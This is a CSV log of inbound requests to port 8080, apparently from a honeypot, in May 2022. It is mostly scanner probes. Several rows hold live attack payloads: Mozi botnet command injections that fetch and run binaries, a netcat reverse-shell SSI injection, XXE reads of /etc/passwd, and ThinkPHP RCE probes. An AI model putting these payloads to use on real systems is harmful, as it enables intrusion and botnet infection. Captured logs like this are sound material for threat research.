ID,ADDR,VALUE,TIME
REQ_76_P8080,"('188.165.87.108', 58021)","b'GET /favicon.ico HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n'",2022-05-11 12:36:23.749125
REQ_77_P8080,"('137.184.37.199', 42814)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-11 12:36:24.090609
REQ_78_P8080,"('137.184.37.199', 43936)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-11 22:59:53.238245
REQ_79_P8080,"('191.5.91.15', 41706)",b'GET / HTTP/1.1\r\n\r\n',2022-05-11 23:13:47.184800
REQ_80_P8080,"('45.61.185.106', 43222)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-11 23:57:11.401027
REQ_81_P8080,"('45.148.10.81', 37784)",b'\x04\x01\x00Ph\x12sa\x00',2022-05-12 00:26:38.250577
REQ_82_P8080,"('127.0.0.1', 1206)","b'GET / HTTP/1.1\r\nHost: localhost:8080\r\nConnection: keep-alive\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: ""Windows""\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 15:29:16.139480
REQ_83_P8080,"('127.0.0.1', 1207)","b'GET / HTTP/1.1\r\nHost: localhost:8080\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: ""Windows""\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 15:29:17.201315
REQ_84_P8080,"('139.162.254.78', 53554)",b'CONNECT 198.50.131.156:80 HTTP/1.1\r\nHost: 198.50.131.156:80\r\nUser-Agent: Python/3.8 python-socks/2.0.3\r\n\r\n',2022-05-12 16:03:27.299430
REQ_85_P8080,"('137.184.38.61', 41626)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-12 16:08:26.893017
REQ_86_P8080,"('45.61.185.106', 51330)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-12 16:33:35.043444
REQ_87_P8080,"('137.184.177.53', 57096)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-12 16:37:44.709335
REQ_88_P8080,"('192.241.214.64', 47730)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-12 17:17:33.896225
REQ_89_P8080,"('179.189.97.159', 45222)",b'GET / HTTP/1.1\r\n\r\n',2022-05-12 17:20:27.252600
REQ_90_P8080,"('192.241.206.199', 40498)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-12 18:38:35.495834
REQ_91_P8080,"('185.180.143.137', 48064)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-12 18:42:39.137680
REQ_92_P8080,"('185.180.143.137', 48528)","b'GET /showLogin.cc HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-12 18:42:39.347111
REQ_93_P8080,"('103.203.57.9', 42012)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n',2022-05-12 22:15:06.377846
REQ_94_P8080,"('103.203.57.9', 42042)",b'GET http://clientapi.ipip.net/echo.php?info=20220512221506 HTTP/1.1\r\nHost: clientapi.ipip.net\r\nAccept: */*\r\nPragma: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)\r\n\r\n',2022-05-12 22:15:06.417249
REQ_95_P8080,"('103.203.57.9', 42410)",b'\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\n(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-12 22:15:07.539358
REQ_96_P8080,"('103.203.57.9', 42786)",b'\x05\x02\x00\x02',2022-05-12 22:15:08.660594
REQ_97_P8080,"('103.203.57.9', 43154)",b'',2022-05-12 22:15:12.748438
REQ_98_P8080,"('103.203.57.9', 43990)",b'\x04\x01\x1f\x00\x00\x00\x00\x00\x00',2022-05-12 22:15:13.873183
REQ_99_P8080,"('103.203.57.9', 44660)",b'',2022-05-12 22:15:24.959292
REQ_100_P8080,"('23.251.102.74', 44770)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-12 23:53:53.316892
REQ_101_P8080,"('103.183.33.27', 22860)",b'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.183.33.27:38267/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',2022-05-12 23:59:09.151809
REQ_102_P8080,"('137.184.38.61', 37428)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-13 08:01:10.285223
REQ_103_P8080,"('128.14.134.170', 38246)",b'GET /version HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 08:03:25.251093
REQ_104_P8080,"('92.118.161.29', 39641)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\n\r\n',2022-05-13 08:15:52.924070
REQ_105_P8080,"('192.241.223.18', 41838)",b'GET /hudson HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 08:24:03.520969
REQ_106_P8080,"('74.82.47.4', 39472)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\n\r\n',2022-05-13 08:26:13.045929
REQ_107_P8080,"('192.241.212.195', 33586)",b'GET /actuator/health HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 10:16:17.114211
REQ_108_P8080,"('46.174.191.28', 38364)","b'GET / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30\r\nAccept: */*\r\n\r\n'",2022-05-13 10:29:33.880459
REQ_109_P8080,"('117.50.110.5', 36816)",b'GET / HTTP/1.0\r\nHost: 54.91.30.20:8080\r\nAccept: */*\r\n\r\n',2022-05-13 10:37:43.666118
REQ_110_P8080,"('59.99.134.147', 36330)",b'GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.99.134.147:45507/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0\r\n\r\n',2022-05-13 10:48:33.154513
REQ_111_P8080,"('138.118.235.184', 50864)",b'GET / HTTP/1.1\r\n\r\n',2022-05-13 11:17:50.301686
REQ_112_P8080,"('45.61.188.45', 57972)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-13 11:22:24.718960
REQ_113_P8080,"('187.73.0.218', 52176)",b'GET / HTTP/1.1\r\n\r\n',2022-05-13 12:04:43.344628
REQ_114_P8080,"('177.55.157.145', 61878)",b'GET / HTTP/1.1\r\n\r\n',2022-05-13 12:05:30.704734
REQ_115_P8080,"('45.61.186.19', 47460)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-13 13:00:57.445272
REQ_116_P8080,"('45.61.188.45', 40478)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-13 22:21:25.762364
REQ_117_P8080,"('178.128.39.148', 45596)",b'CONNECT 188.246.204.244:80 HTTP/1.1\r\nHost: 188.246.204.244:80\r\nUser-Agent: Python/3.8 python-socks/2.0.3\r\n\r\n',2022-05-13 22:36:45.699953
REQ_118_P8080,"('137.184.38.61', 52122)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-13 23:05:35.143454
REQ_119_P8080,"('137.184.177.53', 50012)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-13 23:21:00.634718
REQ_120_P8080,"('137.184.177.40', 50146)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-13 23:26:34.619203
REQ_121_P8080,"('205.210.31.128', 57543)","b""\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03\x82\xe8\x91\xa16\xd2\xf7\xc2Nfk?\x0fR\x86?\xccv\x8b8\xc1\x9f\x90\x16\xc0\x94\xab\x90\xb7\xe0xg\x00\x00h\xcc\x14\xcc\x13\xc0/\xc0+\xc00\xc0,\xc0\x11\xc0\x07\xc0'\xc0#\xc0\x13\xc0\t\xc0(\xc0$\xc0\x14\xc0\n\xcc\x15\x00\x9e\x00\x9f\x00g\x00k\x003\x009\x00\x9c\x00\x9d\x00\x05\x00\x04\x00<\x00=\x00/\x005\xc0\x12\x00\x16\x00\n\x00\x03\x00\x08\x00\x06\x00\x14\x00\x11\x00\x19\x00\x17\x002\xc0\x08\x00\x12\x00\x13\x00\x15\x008\x00@\x00f\x00j\x00\xa2\x00\xa3\x01\x00\x005\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x0c\x00\n\x04\x01\x04\x03\x02\x01\x02\x03\x02\x02\xff\x01\x00\x01\x00\x00\x0f\x00\x01\x01""",2022-05-13 23:28:37.757845
REQ_122_P8080,"('192.241.221.251', 34042)",b'MGLNDD_54.91.30.20_8080\n',2022-05-13 23:51:04.709073
REQ_123_P8080,"('104.248.240.230', 44660)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-16 14:34:53.503577
REQ_124_P8080,"('117.196.48.242', 51492)",b'GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0\r\n\r\n',2022-05-16 15:11:29.485741
REQ_125_P8080,"('168.253.227.141', 41980)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-16 16:05:32.050638
REQ_126_P8080,"('193.106.191.48', 35604)","b'POST /Autodiscover/Autodiscover.xml HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nContent-Length: 314\r\nContent-Type: application/xml\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>\n<Autodiscover xmlns=""http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>'",2022-05-16 16:28:08.647029
REQ_127_P8080,"('137.184.37.199', 39958)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-16 16:34:04.544465
REQ_128_P8080,"('45.148.10.81', 42144)",b'GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0\n\n',2022-05-16 16:48:16.778816
REQ_129_P8080,"('45.61.185.106', 38002)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-16 17:41:19.855014
REQ_130_P8080,"('139.59.164.135', 61953)",b'GET / HTTP/1.0\r\n\r\n',2022-05-16 18:00:23.616088
REQ_131_P8080,"('193.106.191.48', 38452)","b'GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-16 18:13:16.897496
REQ_132_P8080,"('137.184.177.40', 49202)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-16 18:32:05.092062
REQ_133_P8080,"('205.210.31.145', 52417)","b""\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03\xd3\xd5^\xa9\xbc\xf3\x80\xf0y/\xe4\xf0\x9b\xb6\x15\xe4\x8c\x80\xae\xb0=\xa1\xaes\xde\n\xd0\xae\xaa\xfa\x00\xf2\x00\x00h\xcc\x14\xcc\x13\xc0/\xc0+\xc00\xc0,\xc0\x11\xc0\x07\xc0'\xc0#\xc0\x13\xc0\t\xc0(\xc0$\xc0\x14\xc0\n\xcc\x15\x00\x9e\x00\x9f\x00g\x00k\x003\x009\x00\x9c\x00\x9d\x00\x05\x00\x04\x00<\x00=\x00/\x005\xc0\x12\x00\x16\x00\n\x00\x03\x00\x08\x00\x06\x00\x14\x00\x11\x00\x19\x00\x17\x002\xc0\x08\x00\x12\x00\x13\x00\x15\x008\x00@\x00f\x00j\x00\xa2\x00\xa3\x01\x00\x005\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x0c\x00\n\x04\x01\x04\x03\x02\x01\x02\x03\x02\x02\xff\x01\x00\x01\x00\x00\x0f\x00\x01\x01""",2022-05-16 20:31:37.590514
REQ_134_P8080,"('185.23.230.41', 63342)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-16 20:47:12.932333
REQ_135_P8080,"('124.248.189.7', 40835)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-17 07:22:39.252590
REQ_136_P8080,"('177.152.168.69', 33932)",b'GET / HTTP/1.1\r\n\r\n',2022-05-17 07:43:45.111623
REQ_137_P8080,"('177.152.168.69', 33948)",b'GET / HTTP/1.1\r\n\r\n',2022-05-17 07:43:46.393116
REQ_138_P8080,"('193.106.191.48', 44768)","b'GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-17 07:47:29.232185
REQ_139_P8080,"('216.218.206.66', 39992)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\n\r\n',2022-05-17 08:28:18.253781
REQ_140_P8080,"('195.98.175.230', 55895)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-17 08:40:04.961762
REQ_141_P8080,"('137.184.37.199', 55362)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-17 15:22:21.533700
REQ_142_P8080,"('161.35.238.241', 54022)",b'\x00\x0e8\x0f\xbe\xd2\x172\xe2k\xe5\x00\x00\x00\x00\x00',2022-05-17 22:27:30.502801
REQ_143_P8080,"('193.106.191.48', 39590)","b'POST /Autodiscover/Autodiscover.xml HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nContent-Length: 314\r\nContent-Type: application/xml\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>\n<Autodiscover xmlns=""http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>'",2022-05-18 07:00:48.148153
REQ_144_P8080,"('193.106.191.48', 47976)","b'GET /_ignition/execute-solution HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nContent-Type: application/json\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-18 07:32:07.370475
REQ_145_P8080,"('193.106.191.48', 53096)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\r\nContent-Type: application/json\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-18 08:04:03.329719
REQ_146_P8080,"('45.61.188.45', 40972)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-18 08:11:24.145470
REQ_147_P8080,"('49.142.208.132', 41882)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\n\r\n',2022-05-19 11:28:54.620921
REQ_148_P8080,"('49.142.208.132', 41884)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\n\r\n',2022-05-19 11:28:55.759227
REQ_149_P8080,"('49.142.208.132', 41888)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\n\r\n',2022-05-19 11:29:03.131398
REQ_150_P8080,"('137.184.37.199', 58528)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-19 11:48:12.807114
REQ_151_P8080,"('117.198.89.102', 39384)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-19 11:52:35.283740
REQ_152_P8080,"('185.180.143.7', 37616)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-19 13:01:58.364815
REQ_153_P8080,"('94.102.61.45', 39686)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-19 14:13:24.152567
REQ_154_P8080,"('45.61.185.106', 33290)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-19 16:29:25.227808
REQ_155_P8080,"('179.217.58.159', 44091)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-20 14:51:42.663782
